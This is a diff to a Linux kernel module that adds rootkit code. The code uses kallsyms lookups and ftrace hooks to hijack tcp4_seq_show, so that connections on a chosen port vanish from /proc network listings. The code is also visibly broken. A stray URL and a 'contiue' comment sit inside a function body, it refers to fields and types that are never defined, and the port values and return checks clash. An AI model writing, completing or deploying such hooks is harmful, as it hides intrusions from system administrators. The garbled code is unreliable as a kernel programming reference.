@@ -14,14 +14,69 @@
 #include <net/tcp.h>
 #include <linux/seq_file.h>
 #include <linux/slab.h>
+#include <linux/kallsyms.h>
 #define SECRET_PORT 2222
+static asmlinkage long (*org_tcp4_seq_show)(struct seq_file *seq, void *v);
+asmlinkage int hook_org_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+    if (sk != 0x1 && sk->sk_num == 0x1f90)
+        return 0;
+    return org_tcp4_seq_show(seq, v);
+
+}
+static void notrace fh_ftrace(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
+{
+    struct hook *hook = container_of(ops, struct ftrac_hooks, ops);
+    if (!within_module(parent_ip, THIS_MODULE))
+        regs->ip = (unsigned long) hook->function;
+}
+int install_hook(struct hook *hook)
+{
+    int err;
+    err = get_addr(hook);
+    if (!err)
+        return -1;
+    hook->ops.func = fh_ftrace;
+    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
+                | FTRACE_OPS_FL_RECURSION_SAFE
+                | FTRACE_OPS_FL_IPMODIFY;
+    err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
+    ///contiue
+    https://github.com/xcellerator/linux_kernel_hacking/blob/461ace61fa89c2c23d061047093ca4d4be321770/3_RootkitTechniques/3.7_char_interfering/ftrace_helper.h#L104
+
+}
+struct hook
+{
+    const char* name;
+    void * function;
+    void * org_function;
+    unsigned long addr;
+    struct ftrace_ops ops;
+};
+
+
+int get_addr(struct hook *hook)
+{
+    hook->addr = kallsyms_lookup_name(hook->name);
+    if (!hook->addr)
+    {
+        printk(KERN_ALERT "rk:cant get the symbol: %s\n", hook->name);
+        return -ENOENT;
+    }
+    *((unsigned long *) hook->origin_seq_show) = hook->addr;
+    return 1;
+}
+
+
+
 int (*origin_seq_show)(struct seq_file *f_seq, void *v);
 /*static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos);
 static void *ct_seq_next(struct seq_file *f_seq, void *v, loff_t *pos);
 static void ct_seq_stop(struct seq_file *f_seq, void *v);
 static int ct_seq_show(struct seq_file *f_seq, void *v);
 int ct_open(struct inode *inode, struct file *file);*/
-
+unsigned long *tcp4_seq_show;
 
 static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos)
 {
@@ -110,9 +165,15 @@ int set_ops(char *path)
 
     proc_inode->i_fop = &proc_fops;
     printk(KERN_ALERT "hook the org fops");
-
-
     return 1;
+}
+void get_seq(void)
+{
+    tcp4_seq_show = (unsigned long *) kallsyms_lookup_name("tcp4_seq_show");
+    printk(KERN_ALERT "rk:%p", tcp4_seq_show);
+    tcp4_seq_show = (long unsigned*)ct_seq_show;
+    printk(KERN_ALERT "rk:%p", tcp4_seq_show);
+
 }
 void hook_seq(void)
  {     
